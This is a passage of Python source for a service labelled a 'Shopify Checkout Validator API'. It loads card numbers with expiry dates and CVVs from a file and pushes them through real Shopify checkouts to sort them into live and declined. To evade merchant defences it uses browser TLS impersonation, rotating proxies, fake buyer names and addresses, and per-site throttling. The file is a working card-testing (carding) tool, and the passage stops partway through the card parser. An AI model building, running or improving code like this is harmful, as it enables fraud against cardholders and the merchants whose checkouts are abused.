"""
Shopify Checkout Validator API — Stateless v4.6.4

CHANGES vs v4.6.3 (all fixes from the post-v4.6.3 review):
  Fix 1.  validate_card: empty-s_data error loop returns the first
          non-empty normalized code instead of falling through to
          GRAPHQL_ERROR when the code maps to CARD_DECLINED.
  Fix 2.  _parse_gql_errors: exact-match lookup happens before the
          CARD_DECLINED guard, so DECISION_RULE_BLOCK / FRAUD_SUSPECTED
          / etc. are preserved instead of being lost as GRAPHQL_ERROR.
  Fix 3.  SELF_THROTTLED replaces THROTTLED for both self-imposed
          backoff paths (_site_usable self-cooled and _host_rate_allowed
          rate-limit). Added to TRANSIENT_CODES so _record_site_result
          does NOT escalate the 30s host cooldown to a 300s throttle.
  Fix 4.  _record_site_result skips VARIANT_NOT_FOUND so a client-
          supplied bad variant ID cannot dilute the blacklist ratio.
  Fix 5.  _fetch_products early-break now compares against
          HARD_MAX_PRICE * 0.5 (the cache threshold from Fix 9),
          not max_price * 0.5. Restores the v4.6.2 memory sizing.
  Fix 6.  _cache_sweeper uses cap-based eviction (MAX_TRACKED_HOSTS)
          instead of idle-based eviction. Eviction only fires when
          over cap, always picks oldest-seen hosts first, and only
          pops semaphores/locks when they are verifiably idle —
          no more race that could allow SITE_CONCURRENCY + N.
  Fix 7.  (No change — design intent confirmed.)
  Fix 8.  _pick_address handles co.uk / co.jp / com.au / co.nz /
          co.za / co.in before the TLD split.
  Fix 9.  VARIANT_NOT_FOUND is emitted with is_site_error=False so
          Status=True (the site is fine; the client sent a bad ID).
  Fix 10. _HOST_LAST_SEEN is only bumped once the per-host semaphore
          is acquired, so dead-proxy / site-rejected calls do not
          keep a host artificially "fresh" for eviction ordering.
  Fix 11. Removed dead PRICE_OVER_MAX entries from
          _HARD_DEAD_PERMANENT_CODES / _HARD_DEAD_AUTO_MARK /
          SKIP_SITE_CODES (no code path emits this code since v4.6.3).

Retained from v4.6.3 (Fixes 1–16 + M1–M3 of that release):
  - VARIANT_NOT_FOUND replaces PRICE_OVER_MAX for bad variant IDs
  - _fetch_products propagates non-proxy HTTP/transport errors
  - _r() emits normalized code in Response/code/decline_code
  - subtotal extraction never falls back to 0.01
  - missing merch GID returns NEGOTIATE_FAILED
  - products.json caches all candidates up to HARD_MAX_PRICE
  - SUBMIT_FAILED / NEGOTIATE_FAILED / TOKENIZATION_FAILED transient
  - attempt_token regex handles /checkouts/cn/<id> and /checkouts/<id>
  - negotiate.errors is always fatal
  - SITE_VALIDATED reports Approved="True"
  - 12-digit UnionPay accepted
  - /dead-sites/clear also clears _HOST_HITS / _HOST_LAST_SEEN
  - cart/add.js carries browser navigation headers

Retained from v4.6.2 / v4.6.1 (full retention list):
  - SITE_CONCURRENCY=10, products.json?limit=100
  - poll loop continues on error, _looks_like_proxy_error narrowed,
    _HOST_RATE_LIMIT=200, TIMEOUT on fetch, negotiate-phase
    CARD_DECLINED fix, _site_usable real hard-dead code, /shopify
    attempts/auto no-ops, shared_state access helper, cache sweeper,
    AMOUNT_TOO_SMALL→INSUFFICIENT_FUNDS, poll debug logs,
    /health+/dead-sites tuple-form
"""

import asyncio
import copy
import logging
import os
import random
import re
import time
from collections import defaultdict, deque
from typing import Optional
from urllib.parse import urlparse

from curl_cffi.requests import AsyncSession, RequestsError
import orjson
import uvicorn
from fastapi import FastAPI, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from dotenv import load_dotenv
load_dotenv()

try:
    from shared_state import init as _init_shared
    _shared = _init_shared(os.environ.get("REDIS_URL", "").strip())
except Exception:
    _shared = None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PORT              = int(os.environ.get("PORT", 8080))
CARDS_FILE        = os.environ.get("CARDS_FILE", "cards.txt")
MAX_PRICE         = float(os.environ.get("MAX_PRICE", 5.0))
MIN_AMOUNT        = float(os.environ.get("MIN_AMOUNT", 0.50))
HARD_MAX_PRICE    = float(os.environ.get("HARD_MAX_PRICE", 20.0))

# CRITICAL: was 100. Each concurrent card allocates an
# AsyncSession(impersonate="chrome124") plus a parsed 250-product
# response — roughly 100 MB. 100 concurrent = ~10 GB per replica → OOM.
# 10 concurrent = ~1 GB, fits Railway Hobby.
SITE_CONCURRENCY  = int(os.environ.get("SITE_CONCURRENCY", 10))

BLACKLIST_THRESHOLD = float(os.environ.get("BLACKLIST_THRESHOLD", 0.98))
BLACKLIST_SAMPLES   = int(os.environ.get("BLACKLIST_SAMPLES", 50))
BLACKLIST_SECONDS   = int(os.environ.get("BLACKLIST_SECONDS", 15))

REQUEST_TIMEOUT   = float(os.environ.get("REQUEST_TIMEOUT", 12))
CACHE_TTL         = float(os.environ.get("CACHE_TTL", 900))
VARIANT_TTL       = float(os.environ.get("VARIANT_TTL", 3600))
FAIL_CACHE_TTL    = float(os.environ.get("FAIL_CACHE_TTL", 300))
THROTTLE_COOLDOWN = int(os.environ.get("THROTTLE_COOLDOWN", 300))
LOG_LEVEL         = os.environ.get("LOG_LEVEL", "warning").upper()
IMPERSONATE       = os.environ.get("IMPERSONATE", "chrome124")

# v4.6.4 (Fix 6): cap on the number of tracked per-host entries.
# When exceeded, the sweeper evicts oldest-seen hosts. Bounds memory
# without racing against in-flight requests.
MAX_TRACKED_HOSTS = int(os.environ.get("MAX_TRACKED_HOSTS", 5000))

_HARD_DEAD_TTL_PERMANENT = int(os.environ.get("HARD_DEAD_TTL_PERMANENT", 7200))
_HARD_DEAD_TTL_PROBABLE  = int(os.environ.get("HARD_DEAD_TTL_PROBABLE",  1800))
_HARD_DEAD_PERMANENT_CODES = frozenset({
    "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY",
    "PRICE_TOO_HIGH",
    # v4.6.4 (Fix 11): PRICE_OVER_MAX removed — no code path emits it.
})
_HARD_DEAD_PROBABLE_CODES = frozenset({"NO_PRODUCT", "NO_PRODUCT_FOUND"})
_HARD_DEAD_AUTO_MARK = frozenset({
    "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY",
    "PRICE_TOO_HIGH",
    # v4.6.4 (Fix 11): PRICE_OVER_MAX removed — no code path emits it.
})

_HOST_RATE_LIMIT   = int(os.environ.get("HOST_RATE_LIMIT", 200))
_HOST_RATE_WINDOW  = int(os.environ.get("HOST_RATE_WINDOW", 60))
_HOST_COOLDOWN_SEC = int(os.environ.get("HOST_COOLDOWN_SEC", 30))

PROXY_COOLDOWN_BASE = int(os.environ.get("PROXY_COOLDOWN_BASE", 60))
PROXY_COOLDOWN_MAX  = int(os.environ.get("PROXY_COOLDOWN_MAX", 1800))

VALID_API_KEYS = set(
    k.strip() for k in os.environ.get("API_KEYS", "oozaruhshop").split(",")
    if k.strip()
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

KNOWN_CARD_RESPONSES = frozenset({
    "ORDER_PLACED", "INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED",
    "OTP_REQUIRED", "EXPIRED_CARD", "INVALID_CARD", "CARD_DECLINED",
    "FRAUD_SUSPECTED", "DECISION_RULE_BLOCK", "DO_NOT_HONOR",
    "PROCESSING_ERROR", "GENERIC_DECLINE", "AMOUNT_TOO_SMALL",
    "INCORRECT_NUMBER", "PICK_UP_CARD", "TEST_MODE_LIVE_CARD",
    "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD", "STOLEN_CARD",
    "LOST_CARD", "RESTRICTED_CARD", "SITE_VALIDATED",
})

SKIP_SITE_CODES = frozenset({
    "NO_PRODUCT", "NO_PRODUCT_FOUND", "PRICE_TOO_HIGH",
    # v4.6.4 (Fix 11): PRICE_OVER_MAX removed.
    "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "THROTTLED",
    "CAPTCHA_REQUIRED",
})

SITE_ERROR_CODES = frozenset({
    "CHECKOUT_FAILED", "CART_FAILED", "GRAPHQL_ERROR", "SITE_ERROR",
    "SESSION_EXPIRED", "NEGOTIATE_FAILED", "NO_SESSION_TOKEN",
    "NO_ATTEMPT_TOKEN", "NO_SELLER_PROPOSAL", "CHECKPOINTDENIED",
    "SUBMIT_FAILED", "TOKENIZATION_FAILED", "ORDER_CREATION_FAILED",
    "NO_PAYMENT_REQUIRED",
})

TRANSIENT_CODES = frozenset({
    "TIMEOUT", "THROTTLED", "PROXY_ERROR", "GRAPHQL_ERROR", "SITE_ERROR",
    "CHECKOUT_FAILED", "CART_FAILED", "SESSION_EXPIRED",
    "SUBMIT_FAILED", "NEGOTIATE_FAILED", "TOKENIZATION_FAILED",
    # v4.6.4 (Fix 3): self-imposed host cooldown. Do NOT escalate to a
    # 300s site throttle; _record_site_result short-circuits on this.
    "SELF_THROTTLED",
})

HARD_DEAD_CODES = frozenset({
    "NO_PRODUCT", "NO_PRODUCT_FOUND", "SITE_REQUIRES_LOGIN",
    "NO_SHOPIFY_PAYMENTS_GATEWAY", "PRICE_TOO_HIGH",
})

FINAL_CODES = frozenset({
    "ORDER_PLACED", "INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED",
    "OTP_REQUIRED", "EXPIRED_CARD", "INVALID_CARD", "CARD_DECLINED",
    "FRAUD_SUSPECTED", "DECISION_RULE_BLOCK", "DO_NOT_HONOR",
    "PROCESSING_ERROR", "GENERIC_DECLINE", "AMOUNT_TOO_SMALL",
    "INCORRECT_NUMBER", "PICK_UP_CARD", "TEST_MODE_LIVE_CARD",
    "INVALID_PURCHASE_TYPE", "INVALID_PAYMENT_METHOD", "STOLEN_CARD",
    "LOST_CARD", "RESTRICTED_CARD", "SITE_VALIDATED",
})

PROXY_STOP_CODES = frozenset({"PROXY_ERROR"})

LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED", "SITE_VALIDATED",
})

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOGGING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.WARNING),
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("shopify")

PROXY_ERROR_HINTS = (
    "proxy", "tunnel", "407", "socks",
    "empty psk",
    "proxy authentication", "proxy auth",
)

def _looks_like_proxy_error(msg: str) -> bool:
    if not msg:
        return False
    m = str(msg).lower()
    return any(k in m for k in PROXY_ERROR_HINTS)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GRAPHQL FRAGMENTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_PROPOSAL_VARS = (
    "$sessionInput:SessionTokenInput!,"
    "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$checkpointData:String,$queueToken:String,"
    "$reduction:ReductionInput,"
    "$availableRedeemables:AvailableRedeemablesInput,"
    "$tip:TipTermInput,$note:NoteInput,"
    "$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,"
    "$scriptFingerprint:ScriptFingerprintInput,"
    "$transformerFingerprintV2:String,"
    "$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,"
    "$captcha:CaptchaInput,$poNumber:String,"
    "$saleAttributions:SaleAttributionsInput,"
    "$alternativePaymentCurrency:AlternativePaymentCurrencyInput,"
    "$deliveryExpectations:DeliveryExpectationTermsInput,"
    "$memberships:MembershipsInput,"
    "$cartMetafields:[CartMetafieldOperationInput!]"
)

_PROPOSAL_ARGS = (
    "delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
    "reduction:$reduction,availableRedeemables:$availableRedeemables,"
    "tip:$tip,note:$note,poNumber:$poNumber,"
    "nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,"
    "scriptFingerprint:$scriptFingerprint,"
    "transformerFingerprintV2:$transformerFingerprintV2,"
    "optionalDuties:$optionalDuties,attribution:$attribution,"
    "captcha:$captcha,saleAttributions:$saleAttributions,"
    "alternativePaymentCurrency:$alternativePaymentCurrency,"
    "deliveryExpectations:$deliveryExpectations,"
    "memberships:$memberships,"
    "cartMetafields:$cartMetafields"
)

_SELLER_PROPOSAL_FIELDS = (
    "sellerProposal{"
    "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "total{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "delivery{__typename "
    "...on FilledDeliveryTerms{deliveryLines{"
    "availableDeliveryStrategies{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}"
    "estimatedTimeInTransit{...on IntValueConstraint{value}}}}"
    "selectedDeliveryStrategy{__typename "
    "...on CompleteDeliveryStrategy{handle title "
    "amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}"
    "tax{__typename "
    "...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}}"
    "payment{__typename "
    "...on FilledPaymentTerms{availablePaymentLines{"
    "paymentMethod{__typename "
    "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}}"
    "__typename}"
)

_RECEIPT_FRAGMENT = (
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token __typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
    "...on WaitingReceipt{id pollDelay __typename}"
    "...on ActionRequiredReceipt{id action{"
    "...on CompletePaymentChallenge{offsiteRedirect url __typename}"
    "...on CompletePaymentChallengeV2{challengeType challengeData __typename}"
    "__typename}timeout{millisecondsRemaining __typename}__typename}"
    "...on FailedReceipt{id processingError{"
    "...on InventoryClaimFailure{__typename}"
    "...on InventoryReservationFailure{__typename}"
    "...on OrderCreationFailure{paymentsHaveBeenReverted __typename}"
    "...on PaymentFailed{code messageUntranslated __typename}"
    "__typename}__typename}__typename}"
)

QUERY_PROPOSAL_SHIPPING = (
    "query Proposal(" + _PROPOSAL_VARS + ")"
    "{session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{"
    + _PROPOSAL_ARGS + "},"
    "checkpointData:$checkpointData,queueToken:$queueToken})"
    "{__typename result{__typename "
    "...on NegotiationResultAvailable{checkpointData queueToken sessionToken "
    + _SELLER_PROPOSAL_FIELDS + "}"
    "...on CheckpointDenied{redirectUrl}"
    "...on Throttled{pollAfter queueToken pollUrl}"
    "...on TooManyRequests{__typename}"
    "...on NegotiationResultFailed{__typename}}"
    "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
)

MUTATION_SUBMIT = (
    "mutation SubmitForCompletion("
    "$input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],"
    "$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput)"
    "{submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields "
    "postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{"
    "errors{code localizedMessage nonLocalizedMessage __typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails}__typename}"
    "...on TooManyRequests{__typename}"
    "...on TooManyAttempts{__typename}"
    "__typename}}"
    + _RECEIPT_FRAGMENT
)

QUERY_POLL = (
    "query PollForReceipt($receiptId:ID!,$sessionToken:String!)"
    "{receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken})"
    "{...ReceiptDetails __typename}}"
    + _RECEIPT_FRAGMENT
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ADDRESSES / IDENTITY / HEADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH", "AUD": "AU",
    "EUR": "DE", "NZD": "NZ", "SGD": "SG", "MYR": "MY",
    "PHP": "PH", "THB": "TH", "ZAR": "ZA", "BRL": "BR",
    "MXN": "MX", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "JPY": "JP", "KRW": "KR",
}

ADDRESS_BOOK: dict[str, dict] = {
    "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
    "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London",      "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
    "AU": {"address1": "1 Martin Place",    "city": "Sydney",      "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Unter den Linden 1","city": "Berlin",      "postalCode": "10117",   "zoneCode": "BE",  "countryCode": "DE", "phone": "3012345678"},
    "FR": {"address1": "1 Rue de Rivoli",   "city": "Paris",       "postalCode": "75001",   "zoneCode": "IDF", "countryCode": "FR", "phone": "142123456"},
    "IN": {"address1": "1 MG Road",         "city": "Bangalore",   "postalCode": "560001",  "zoneCode": "KA",  "countryCode": "IN", "phone": "8041234567"},
    "JP": {"address1": "1-1 Chiyoda",       "city": "Tokyo",       "postalCode": "100-0001","zoneCode": "13",  "countryCode": "JP", "phone": "312345678"},
    "NZ": {"address1": "1 Queen Street",    "city": "Auckland",    "postalCode": "1010",    "zoneCode": "AUK", "countryCode": "NZ", "phone": "937912345"},
    "ZA": {"address1": "1 Sandton Drive",   "city": "Sandton",     "postalCode": "2196",    "zoneCode": "GP",  "countryCode": "ZA", "phone": "112345678"},
    "DEFAULT": {"address1": "123 Main St",  "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
}

FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas",
               "Mary","Patricia","Jennifer","Linda","Barbara","Susan","Jessica","Sarah","Karen",
               "Emily","Ashley","Daniel","Matthew","Andrew","Joshua","Christopher","Ryan","Tyler"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
               "Martinez","Hernandez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Lee",
               "White","Harris","Martin","Thompson","Turner","Mitchell","Campbell","Roberts","Evans"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","icloud.com"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GLOBAL STATE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
    lambda: asyncio.Semaphore(SITE_CONCURRENCY)
)
_variant_cache: dict[str, dict] = {}
_product_cache: dict[str, dict] = {}
_host_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)

_site_stats: dict[str, dict] = defaultdict(lambda: {
    "outcomes":          deque(maxlen=BLACKLIST_SAMPLES),
    "blacklisted_until": 0.0,
    "last_response":     "",
})
_site_throttle: dict[str, float] = {}

_HARD_DEAD_CACHE: dict[str, tuple[float, str]] = {}

_HOST_HITS: dict[str, deque] = defaultdict(
    lambda: deque(maxlen=_HOST_RATE_LIMIT + 1)
)
_HOST_COOLDOWN: dict[str, float] = {}
# v4.6.4 (Fix 6 / Fix 10): last time a request actually processed this
# host (bumped inside async with sem:, not on early rejections).
_HOST_LAST_SEEN: dict[str, float] = {}

_PROXY_DEAD_UNTIL: dict[str, float] = {}
_PROXY_FAIL_COUNT: dict[str, int] = {}

_cards_cache: list[dict] = []
_cards_loaded_at: float = 0.0

_cache_sweeper_task: Optional[asyncio.Task] = None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CACHE HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _cache_get(hostname: str) -> Optional[dict]:
    cached = _product_cache.get(hostname)
    if not cached:
        return None
    expiry = cached.get("expires_at", cached.get("ts", 0) + CACHE_TTL)
    return cached if time.time() < expiry else None

def _cache_write_success(hostname: str, product: Optional[dict], candidates: list[dict]) -> None:
    _product_cache[hostname] = {
        "product": product, "candidates": candidates,
        "err": None, "ts": time.time(),
    }

def _cache_write_failure(hostname: str, err: str, ttl: Optional[float] = None) -> None:
    now = time.time()
    _product_cache[hostname] = {
        "product": None, "candidates": [], "err": err,
        "ts": now, "expires_at": now + (ttl if ttl is not None else FAIL_CACHE_TTL),
    }

async def _cache_sweeper():
    while True:
        try:
            await asyncio.sleep(120)
            now = time.time()
            for h, e in list(_product_cache.items()):
                exp = e.get("expires_at", e.get("ts", 0) + CACHE_TTL)
                if now > exp:
                    _product_cache.pop(h, None)
            for h, e in list(_variant_cache.items()):
                if now - e.get("ts", 0) > VARIANT_TTL:
                    _variant_cache.pop(h, None)
            for h, entry in list(_HARD_DEAD_CACHE.items()):
                if now >= entry[0]:
                    _HARD_DEAD_CACHE.pop(h, None)
            for p, exp in list(_PROXY_DEAD_UNTIL.items()):
                if now >= exp:
                    _PROXY_DEAD_UNTIL.pop(p, None)
                    _PROXY_FAIL_COUNT.pop(p, None)
            for h, exp in list(_HOST_COOLDOWN.items()):
                if now >= exp:
                    _HOST_COOLDOWN.pop(h, None)

            # v4.6.4 (Fix 6): cap-based eviction. Only fires when the
            # tracked-host set exceeds MAX_TRACKED_HOSTS, and always
            # evicts the oldest-seen entries first. Semaphores / locks
            # are only popped when verifiably idle, which prevents the
            # v4.6.3 race that could allow SITE_CONCURRENCY + N.
            if len(_HOST_LAST_SEEN) > MAX_TRACKED_HOSTS:
                overflow = len(_HOST_LAST_SEEN) - MAX_TRACKED_HOSTS
                oldest = sorted(
                    _HOST_LAST_SEEN.items(), key=lambda kv: kv[1]
                )[:overflow]
                for h, _ts in oldest:
                    _HOST_LAST_SEEN.pop(h, None)
                    _site_stats.pop(h, None)
                    _site_throttle.pop(h, None)
                    _HOST_HITS.pop(h, None)
                    _HOST_COOLDOWN.pop(h, None)
                    sem = _site_semaphores.get(h)
                    if (sem is not None
                            and getattr(sem, "_value",
                                        SITE_CONCURRENCY) == SITE_CONCURRENCY):
                        _site_semaphores.pop(h, None)
                    lock = _host_locks.get(h)
                    if lock is not None and not lock.locked():
                        _host_locks.pop(h, None)
        except asyncio.CancelledError:
            return
        except Exception as e:
            log.debug("cache sweeper error: %s", e)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE NORMALIZATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _normalize_site(s: Optional[str]) -> str:
    if not s:
        return ""
    s = s.strip()
    if not s:
        return ""
    return s if s.startswith(("http://", "https://")) else f"https://{s}"

def _parse_sites_param(raw: Optional[str]) -> list[str]:
    if not raw:
        return []
    seen: set[str] = set()
    out: list[str] = []
    for chunk in raw.split(","):
        norm = _normalize_site(chunk)
        if not norm or norm in seen:
            continue
        seen.add(norm)
        out.append(norm)
    return out

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _parse_proxy(raw: Optional[str]) -> Optional[str]:
    if not raw:
        return None
    s = raw.strip()
    if not s:
        return None
    if "://" in s:
        return s
    if "@" in s and ":" in s:
        return f"http://{s}"
    parts_ws = s.split()
    if len(parts_ws) == 4:
        user, pwd, host, port = parts_ws
        return f"http://{user}:{pwd}@{host}:{port}"
    parts = s.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None

def _mask_proxy(p: Optional[str]) -> str:
    if not p:
        return ""
    if "@" in p:
        scheme, _, rest = p.partition("://")
        if rest:
            _, _, host = rest.partition("@")
            return f"{scheme}://***@{host}"
        _, _, host = p.partition("@")
        return f"***@{host}"
    return p

def _proxy_usable(proxy_str: Optional[str]) -> tuple[bool, str]:
    if not proxy_str:
        return True, ""
    now = time.time()
    if _shared and _shared.enabled and _shared.is_proxy_dead(proxy_str):
        return False, "cooling down (cluster)"
    dead_until = _PROXY_DEAD_UNTIL.get(proxy_str, 0)
    if now < dead_until:
        return False, f"cooling down {int(dead_until - now)}s"
    return True, ""

def _mark_proxy_dead(proxy_str: Optional[str], error: str) -> None:
    if not proxy_str:
        return
    fail_count = _PROXY_FAIL_COUNT.get(proxy_str, 0) + 1
    _PROXY_FAIL_COUNT[proxy_str] = fail_count
    cooldown = min(
        PROXY_COOLDOWN_BASE * (2 ** min(fail_count - 1, 6)),
        PROXY_COOLDOWN_MAX,
    )
    exp = time.time() + cooldown
    _PROXY_DEAD_UNTIL[proxy_str] = exp
    if _shared and _shared.enabled:
        _shared.mark_proxy_dead(proxy_str, exp)
    log.debug("[API] proxy DEAD for %ds (fail#%d): %s (%s)",
              cooldown, fail_count, _mask_proxy(proxy_str)[:50], (error or "")[:80])

def _mark_proxy_alive(proxy_str: Optional[str]) -> None:
    if not proxy_str:
        return
    _PROXY_DEAD_UNTIL.pop(proxy_str, None)
    _PROXY_FAIL_COUNT.pop(proxy_str, None)
    if _shared and _shared.enabled:
        _shared.mark_proxy_alive(proxy_str)

def _make_session(proxy_str: Optional[str] = None) -> AsyncSession:
    proxy = _parse_proxy(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    return AsyncSession(
        impersonate=IMPERSONATE, timeout=REQUEST_TIMEOUT, proxies=proxies
    )

async def _close_session(s: AsyncSession) -> None:
    try:
        res = s.close()
        if asyncio.iscoroutine(res):
            await res
    except Exception:
        pass

def _pick_proxy(proxy_param: Optional[str]) -> tuple[Optional[str], list[str]]:
    if not proxy_param:
        return None, []
    raw = [p.strip() for p in proxy_param.split(",") if p.strip()]
    if not raw:
        return None, []
    rejected: list[str] = []
    for p in raw:
        ok, reason = _proxy_usable(p)
        if ok:
            return p, rejected
        rejected.append(f"{_mask_proxy(p)}: {reason}")
    return None, rejected

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARDS / IDENTITY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _reload_cards() -> None:
    global _cards_cache, _cards_loaded_at
    _cards_cache = _load_cards_from_file()
    _cards_loaded_at = time.time()

def _load_cards_from_file() -> list[dict]:
    cards = []
    if not os.path.exists(CARDS_FILE):
        return cards
    with open(CARDS_FILE, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            card = _parse_card(line.strip())
            if card:
                cards.append(card)
    return cards

def _get_cards() -> list[dict]:
    global _cards_cache, _cards_loaded_at
    if not _cards_cache or (time.time() - _cards_loaded_at) > 120:
        _reload_cards()
    return _cards_cache

def _parse_card(raw: str) -> Optional[dict]:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    parts = raw.replace(" ", "").split("|")
    if len(parts) != 4:
        return None
    cc_num, mon, yr, cvv = [p.strip() for p in parts]
    if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
        return None
    if len(yr) == 4:
        yr = yr[2:]
    if len(yr) != 2:
        return None
    if not 1 <= int(mon) <= 12:
        return None
    # v4.6.3 (M1): accept 12-digit UnionPay
    if len(cc_num) < 12 or len(cc_num) > 19:
        return None
